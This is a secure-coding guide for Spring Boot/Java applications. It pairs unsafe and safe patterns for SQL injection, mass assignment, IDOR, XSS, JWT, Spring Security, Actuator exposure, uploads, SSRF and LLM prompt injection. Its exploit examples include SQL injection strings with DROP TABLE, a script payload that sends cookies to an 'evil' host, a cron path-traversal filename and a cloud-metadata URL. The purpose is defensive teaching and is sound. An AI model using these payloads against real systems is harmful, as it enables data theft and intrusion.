# Spring Boot / Java — unsafe → safe patterns

Concrete, copy-pasteable patterns. Each shows the vulnerability, the exploit, and the fix.
This is the core knowledge for a Spring Boot ABM (alta/baja/modificación) with MVC, JPA,
REST, JWT and a Thymeleaf or React front.

---

## 1. JPA & SQL injection

### ❌ Unsafe — string concatenation in a native query

```java
@Query(value = "SELECT * FROM producto WHERE nombre = '" + nombre + "'", nativeQuery = true)
List<Producto> buscar(String nombre);
```

Exploit: `nombre = ' OR '1'='1' --` returns every row. `nombre = '; DROP TABLE producto;--` is worse.

### ✅ Safe — named parameters (JPQL)

```java
@Query("SELECT p FROM Producto p WHERE p.nombre = :nombre")
List<Producto> buscar(@Param("nombre") String nombre);
```

### ✅ Safe — native with positional params

```java
@Query(value = "SELECT * FROM producto WHERE nombre = ?1", nativeQuery = true)
List<Producto> buscar(String nombre);
```

### ⚠️ Hidden SQLi — user-controlled sort / page fields

```java
// ❌ UNSAFE: attacker sends ?sort=id;DROP-- or a column name to dump other data
public Page<Producto> listar(String sort) {
    return repo.findAll(PageRequest.of(0, 20, Sort.by(sort)));
}

// ✅ SAFE: allowlist the sortable columns
private static final Set<String> SORTABLE = Set.of("nombre", "precio", "fechaAlta");
public Page<Producto> listar(String sort) {
    String col = SORTABLE.contains(sort) ? sort : "fechaAlta";
    return repo.findAll(PageRequest.of(0, 20, Sort.by(Sort.Direction.ASC, col)));
}
```

### ✅ Safe — prefer derived queries / Specification over raw SQL

```java
List<Producto> findByNombreContainingIgnoreCase(String nombre);
```

### ❌ Unsafe — `Specification` built by concatenation, or `JpaSpecificationExecutor`
with a user-supplied predicate string. Keep predicate construction typed, never string-built.

---

## 2. Mass assignment / over-posting (DTOs + `@Valid`)

### ❌ Unsafe — bind request body straight to the entity

```java
@PostMapping("/usuarios")
public String crear(Usuario usuario) {          // attacker adds ?rol=ADMIN or {"rol":"ADMIN"}
    repo.save(usuario);
    return "redirect:/usuarios";
}
```

Exploit: `POST /usuarios?nombre=x&rol=ADMIN&activo=true` escalates privileges, because
`Usuario` (the `@Entity`) has `rol`/`activo` fields.

### ✅ Safe — a DTO with only the fields the form should set + server-side validation

```java
public record UsuarioCrearDto(
    @NotBlank @Size(max = 50) String nombre,
    @Email @NotBlank String email,
    @NotBlank @Size(min = 8) String password
) {}

@PostMapping("/usuarios")
public String crear(@Valid @ModelAttribute UsuarioCrearDto dto, BindingResult br) {
    if (br.hasErrors()) return "usuarios/form";          // server-side, not just JS
    service.crear(dto);                                   // rol stays DEFAULT inside service
    return "redirect:/usuarios";
}
```

The service maps DTO → entity and **sets role/owner explicitly** to a safe default. Never let
the client choose its own role, owner, balance, or active flag.

---

## 3. IDOR & access control (the #1 ABM finding)

### ❌ Unsafe — trust the `id` in the path, no ownership check

```java
@GetMapping("/facturas/{id}")
public Factura ver(@PathVariable Long id) {
    return facturaRepo.findById(id).orElseThrow();     // any logged-in user reads any invoice
}
```

Exploit: change `{id}` from 5 to 6, 7, 8 … enumerate everyone's data.

### ✅ Safe — enforce ownership in the **service layer**

```java
public Factura ver(Long id) {
    Long current = auth.getUserId();                    // from SecurityContext
    Factura f = facturaRepo.findById(id).orElseThrow();
    if (!f.getClienteId().equals(current)) {
        throw new AccessDeniedException("No autorizado");   // or return 404 to avoid leaking existence
    }
    return f;
}
```

### ✅ Safe — method-level security for role checks

```java
@PreAuthorize("hasRole('ADMIN')")
@GetMapping("/admin/usuarios")
public Page<Usuario> listar(...) { ... }

@PreAuthorize("#id == authentication.principal.userId or hasRole('ADMIN')")
@GetMapping("/facturas/{id}")
public Factura ver(@PathVariable Long id) { ... }
```

Enable it once: `@EnableMethodSecurity` on a `@Configuration`. See `reference/auth-authz.md`.

### ✅ Safe — mass-assignment via the update endpoint

Update via a DTO, never `save(requestBodyAsEntity)`, and re-check ownership before writing.
Never let a client-supplied `id` in the body pick the target of a write (that's IDOR-write).

---

## 4. Thymeleaf & React output encoding (XSS)

### ❌ Unsafe — Thymeleaf unescaped output

```html
<div th:utext="${producto.descripcion}"></div>
```

`th:utext` inserts raw HTML. If a user stored `<script>fetch('//evil/'+document.cookie)</script>`
in `descripcion`, it runs for every viewer (stored XSS).

### ✅ Safe — escaped output (default `th:text`)

```html
<div th:text="${producto.descripcion}"></div>
```

Only use `th:utext` for content you have sanitized server-side (e.g. an allowlist sanitizer).

### ❌ Unsafe — React `dangerouslySetInnerHTML`

```jsx
<div dangerouslySetInnerHTML={{ __html: producto.descripcion }} />
```

### ✅ Safe — render as text; if you must render rich HTML, sanitize with DOMPurify

```jsx
<div>{producto.descripcion}</div>
// or, if rich HTML is a hard requirement:
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(producto.descripcion) }} />
```

React escapes text children by default — you only open the XSS hole by reaching for
`dangerouslySetInnerHTML`. Note: React/Angular are NOT XSS-safe if you bypass their encoding.

### Reflected XSS in search results

Echoing a query param back into a view without escaping is the classic reflected XSS.
`th:text` / React text nodes handle it; raw `out.print` into HTML does not.

---

## 5. JWT (JSON Web Token)

### ❌ Unsafe — algorithm confusion / `none` accepted

```java
Jwts.parser().setSigningKey(secret).parseClaimsJws(token);   // older jjwt accepts alg=none
```

### ✅ Safe — pin the algorithm, validate all claims (jjwt 0.12.x)

```java
SecretKey key = Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8)); // from ENV

Claims claims = Jwts.parser()
    .verifyWith(key)                       // pins to HMAC; rejects "none"
    .requireIssuedAt(now)                  // reject tokens with no iat
    .requireExpiration(now.plusHours(1))   // MUST check exp
    .requireIssuer("abm-backend")          // check iss
    .requireAudience("abm-frontend")       // check aud
    .build()
    .parseSignedClaims(token)              // throws on tamper/expiry
    .getPayload();
```

- **Secret from env**, never committed: `jwt.secret` via `String secret = env.getProperty("JWT_SECRET")`. A hardcoded secret in `application.yml` is a `P0` — the repo leaks it and every token can be forged.
- **Never trust a role/ID claim alone for authorization** without re-checking server-side where it matters. A JWT is a bearer token; if it's signed with a weak/known key, the attacker forges `rol:ADMIN`.
- Reject tokens with an empty or unexpected `alg`.

### ❌ Unsafe — signing with `MD5`/`SHA-1`/weak key, or `NONE` alg.

---

## 6. Spring Security configuration

### ❌ Unsafe — everything open, or `permitAll()` on real endpoints

```java
http.csrf().disable()
    .authorizeHttpRequests(a -> a
        .requestMatchers("/usuarios/**").permitAll()   // IDOR + no auth
        .anyRequest().permitAll());
```

### ✅ Safe — deny by default, minimal exceptions, CSRF respected

```java
http
    .authorizeHttpRequests(auth -> auth
        .requestMatchers("/login", "/css/**", "/h2-console/**").permitAll()  // truly public
        .requestMatchers("/admin/**").hasRole("ADMIN")
        .anyRequest().authenticated()                                         // everything else closed
    )
    .sessionManagement(s -> s.sessionCreationPolicy(STATELESS))               // if using JWT
    .csrf(csrf -> csrf.ignoringRequestMatchers("/api/**"));                   // only if API uses tokens, not cookies
```

- `permitAll()` is the single most common "we left the door open" line. Every matcher you add to it deserves a comment justifying it.
- If your API authenticates via a JWT header (not a cookie), CSRF is not the concern — but if you use **cookie-based** session auth, do **not** disable CSRF.

### CORS

```java
// ❌ UNSAFE: allows any origin to send credentialed requests
registry.allowedOriginPatterns("*").allowCredentials(true);

// ✅ SAFE: pin to your front-end origin(s)
registry.allowedOrigins("http://localhost:5173")   // your React dev origin
    .allowedMethods("GET","POST","PUT","DELETE")
    .allowCredentials(true)
    .maxAge(3600);
```

`*` with `allowCredentials(true)` = any website can make authenticated requests as your user.

---

## 7. Actuator / debug / config leakage

### ❌ Unsafe — exposure of actuator + h2 + devtools

```yaml
# application.yml (committed to git — also leaks DB creds + JWT secret!)
management:
  endpoints:
    web:
      exposure:
        include: "*"          # /actuator/env, /heapdump exposed
spring:
  datasource:
    username: root
    password: root
```

Exploit: `/actuator/env` dumps config (secrets). `/actuator/heapdump` lets an attacker pull
the JVM heap and recover tokens/passwords.

### ✅ Safe

```yaml
management:
  endpoints:
    web:
      exposure:
        include: "health,info"      # only non-sensitive
  endpoint:
    health:
      show-details: "never"
spring:
  devtools:
    restart:
      enabled: false
```

And move all secrets to env vars / a vault; keep `application.yml` free of real credentials
(use `application-example.yml` in git). `gitleaks` runs in CI to catch these.

---

## 8. File upload & path traversal

```java
// ❌ UNSAFE
File dest = new File(UPLOAD_DIR + File.separator + file.getOriginalFilename());
// attacker sends filename "../../etc/cron.d/evil"

// ✅ SAFE — never use the client filename as a path; generate a UUID and check the content type
String ext = FilenameUtils.getExtension(file.getOriginalFilename());   // validated against an allowlist
String stored = UUID.randomUUID() + "." + ext;
Path dest = Paths.get(UPLOAD_DIR, stored).normalize();
if (!dest.startsWith(Paths.get(UPLOAD_DIR).toRealPath())) throw new SecurityException("path traversal");
```

---

## 9. SSRF — user-supplied URL reaching internal services

```java
// ❌ UNSAFE: attacker passes http://169.254.169.254/latest/meta-data/ (cloud metadata)
new URL(userProvidedUrl).openStream();

// ✅ SAFE — allowlist schemes + hosts, block private/link-local ranges
```

Only allow `https` + a known host set; reject anything resolving to private IP ranges.

---

## 10. Deserialization, crypto, and misc

- **Never** `ObjectInputStream` on untrusted bytes (Java deserialization RCE).
- Crypto: `AES/GCM/NoPadding` (authenticated), `Argon2`/`bcrypt` for passwords
  (`PasswordEncoderFactories.createDelegatingPasswordEncoder()`), CSPRNG
  (`SecureRandom`) for tokens/IDs. Never `MD5`/`SHA-1`/`ECB`/hardcoded IV/salt.
- **Do not** build file paths / commands from user input. Use `ProcessBuilder` with a list, never a joined string.
- **SpEL injection**: never `SpelExpressionParser().parseExpression(userInput)`.
- **Logging**: never log passwords, tokens, full PII. Log security events (login success/fail,
  access denied), not secrets.

---

## LLM & Agentic (OPTIONAL — only if the project uses an LLM)

Enable only if `pom.xml`/`build.gradle` includes `langchain4j`, `spring-ai`, or an
OpenAI/Anthropic SDK. Otherwise ignore this subsection.

- **LLM10 (Improper Output Handling):** treat **every** model output as untrusted input. If a
  model response flows into SQL, a shell, an HTML template, or a tool call, validate/escape/sandbox it.
- **Prompt injection (LLM01):** external content (files, web pages, user messages, tool output)
  can carry instructions that hijack the model. Fence untrusted content as *data*, keep secrets
  and dangerous tools out of the model's reach.
- **Excessive agency (LLM03):** give the model the minimum tools/permissions; require human
  approval for destructive actions; scope credentials per task.
- **Hidden context exposure (LLM08):** assume system prompt + tool schemas are extractable —
  never put secrets or hard authorization rules only there.
- **Output to sinks:** any LLM-generated code or query is untrusted until reviewed.
